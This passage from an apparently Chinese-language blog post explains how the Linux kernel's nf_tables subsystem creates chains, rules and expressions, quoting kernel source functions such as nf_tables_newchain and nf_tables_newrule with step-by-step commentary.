ctx-&gt;net;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> **<span class="title">rules</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (table-&gt;use == UINT_MAX)</span><br><span class="line">    <span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nla[NFTA_CHAIN_HOOK]) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_hook</span> <span class="title">hook</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">    err = nft_chain_parse_hook(net, nla, &amp;hook, family, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    basechain = kzalloc(<span class="keyword">sizeof</span>(*basechain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (basechain == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      nft_chain_release_hook(&amp;hook);</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hook.dev != <span class="literal">NULL</span>)</span><br><span class="line">      <span class="built_in">strncpy</span>(basechain-&gt;dev_name, hook.dev-&gt;name, IFNAMSIZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nla[NFTA_CHAIN_COUNTERS]) &#123;</span><br><span class="line">      stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);</span><br><span class="line">      <span class="keyword">if</span> (IS_ERR(stats)) &#123;</span><br><span class="line">        nft_chain_release_hook(&amp;hook);</span><br><span class="line">        kfree(basechain);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(stats);</span><br><span class="line">      &#125;</span><br><span class="line">      rcu_assign_pointer(basechain-&gt;stats, stats);</span><br><span class="line">      static_branch_inc(&amp;nft_counters_enabled);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    basechain-&gt;type = hook.type;</span><br><span class="line">    chain = &amp;basechain-&gt;chain;</span><br><span class="line"></span><br><span class="line">    ops= &amp;basechain-&gt;ops;</span><br><span class="line">    ops-&gt;pf= family;</span><br><span class="line">    ops-&gt;hooknum= hook.num;</span><br><span class="line">    ops-&gt;priority= hook.priority;</span><br><span class="line">    ops-&gt;priv= chain;</span><br><span class="line">    ops-&gt;hook= hook.type-&gt;hooks[ops-&gt;hooknum];</span><br><span class="line">    ops-&gt;dev= hook.dev;</span><br><span class="line"></span><br><span class="line">    chain-&gt;flags |= NFT_BASE_CHAIN;</span><br><span class="line">    basechain-&gt;policy = policy;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chain = kzalloc(<span class="keyword">sizeof</span>(*chain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (chain == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line">  ctx-&gt;chain = chain;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD(&amp;chain-&gt;rules);</span><br><span class="line">  chain-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line">  chain-&gt;table = table;</span><br><span class="line">  chain-&gt;name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!chain-&gt;name) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rules = nf_tables_chain_alloc_rules(chain, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!rules) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *rules = <span class="literal">NULL</span>;</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_0, rules);</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_1, rules);</span><br><span class="line"></span><br><span class="line">  err = nf_tables_register_hook(net, table, chain);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">  err = rhltable_insert_key(&amp;table-&gt;chains_ht, chain-&gt;name,</span><br><span class="line">                            &amp;chain-&gt;rhlhead, nft_chain_ht_params);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line">  err = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rhltable_remove(&amp;table-&gt;chains_ht, &amp;chain-&gt;rhlhead,</span><br><span class="line">                    nft_chain_ht_params);</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  table-&gt;use++;</span><br><span class="line">  list_add_tail_rcu(&amp;chain-&gt;<span class="built_in">list</span>, &amp;table-&gt;chains);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  err2:</span><br><span class="line">  nf_tables_unregister_hook(net, table, chain);</span><br><span class="line">  err1:</span><br><span class="line">  nf_tables_chain_destroy(ctx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);</code>创建<code>basechain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span><span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_type</span>*<span class="title">type</span>;</span></span><br><span class="line">u8policy;</span><br><span class="line">u8flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span>*<span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span><span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">char</span> dev_name[IFNAMSIZ];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随后将其中的成员地址给到<code>chain</code>，后续就是一系列的初始化环节</p><h3 id="创建rule操作"><a href="#创建rule操作" class="headerlink" title="创建rule操作"></a>创建rule操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err, rem;</span><br><span class="line">u64 handle, pos_handle;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));</span><br><span class="line">rule = __nft_rule_lookup(chain, handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">old_rule = rule;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||</span><br><span class="line">    nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_POSITION]) &#123;</span><br><span class="line">pos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));</span><br><span class="line">old_rule = __nft_rule_lookup(chain, pos_handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_POSITION_ID]) &#123;</span><br><span class="line">old_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">      <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">      GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"><span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">size += info[n].ops-&gt;size;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Check for overflow of dlen field */</span></span><br><span class="line">err = -EFBIG;</span><br><span class="line"><span class="keyword">if</span> (size &gt;= <span class="number">1</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_USERDATA]) &#123;</span><br><span class="line">ulen = nla_len(nla[NFTA_RULE_USERDATA]);</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">usize = <span class="keyword">sizeof</span>(struct nft_userdata) + ulen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">rule-&gt;handle = handle;</span><br><span class="line">rule-&gt;dlen   = size;</span><br><span class="line">rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">udata = nft_userdata(rule);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">err = nf_tables_newexpr(&amp;ctx, &amp;info[i], expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;validate)</span><br><span class="line">nft_validate_state_update(net, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;</span><br><span class="line">trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line">err = nft_delrule(&amp;ctx, old_rule);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line">chain-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;nft.validate_state == NFT_VALIDATE_DO)</span><br><span class="line"><span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err2:</span><br><span class="line">nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err1:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (info[i].ops) &#123;</span><br><span class="line">module_put(info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">info[i].ops-&gt;type-&gt;release_ops(info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先前两步就是获取<code>table</code>和<code>chain</code>，若是设置了<code>nla[NFTA_RULE_EXPRESSIONS]</code>则遍历所有的<code>expression</code>的大小，并赋值给size。若是设置了<code>nla[NFTA_RULE_USERDATA]</code>则是把<code>userdata</code>的大小放到usize中。</p><p><code>rule = kzalloc(sizeof(*rule) + size + usize, GFP_KERNEL);</code>随即调用这条语句分配<code>rule</code>，紧接着就是一系列初始化。</p><h3 id="创建expression操作"><a href="#创建expression操作" class="headerlink" title="创建expression操作"></a>创建expression操作</h3><p>创建<code>expression</code>的操作其实也是发生在<code>nf_tables_newrule</code>函数中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">  info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">                        <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">                        GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!info)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">    err = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    <span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    size += info[n].ops-&gt;size;</span><br><span class="line">    n++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是在这里通过<code>nf_tables_expr_parse</code>初始化<code>info</code>为某个type的ops。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *__<span class="title">nft_expr_type_get</span>(<span class="title">u8</span> <span class="title">family</span>,</span></span><br><span class="line"><span class="class">       <span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(type, &amp;nf_tables_expressions, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_strcmp(nla, type-&gt;name) &amp;&amp;</span><br><span class="line">    (!type-&gt;family || type-&gt;family == family))</span><br><span class="line"><span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nf_tables_expr_parse</code>最终会调用到<code>__nft_expr_type_get</code>随后遍历<code>nf_tables_expressions</code>，找到对应的<code>type</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">NFPROTO_UNSPEC =  <span class="number">0</span>,</span><br><span class="line">NFPROTO_INET   =  <span class="number">1</span>,</span><br><span class="line">NFPROTO_IPV4   =  <span class="number">2</span>,</span><br><span class="line">NFPROTO_ARP    =  <span class="number">3</span>,</span><br><span class="line">NFPROTO_NETDEV =  <span class="number">5</span>,</span><br><span class="line">NFPROTO_BRIDGE =  <span class="number">7</span>,</span><br><span class="line">NFPROTO_IPV6   = <span class="number">10</span>,</span><br><span class="line">NFPROTO_DECNET = <span class="number">12</span>,</span><br><span class="line">NFPROTO_NUMPROTO,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span 